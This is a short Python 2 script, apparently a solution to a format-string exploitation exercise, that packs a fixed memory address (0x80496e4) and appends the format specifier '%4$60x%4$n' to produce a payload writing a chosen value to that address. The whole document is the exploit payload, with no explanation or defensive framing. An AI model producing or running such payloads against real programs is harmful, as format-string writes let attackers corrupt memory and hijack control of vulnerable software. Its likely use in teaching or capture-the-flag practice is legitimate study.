#!/usr/bin/env python
import struct

target = struct.pack("<I", 0x80496e4)
format = "%4$60x%4$n"

print target+format
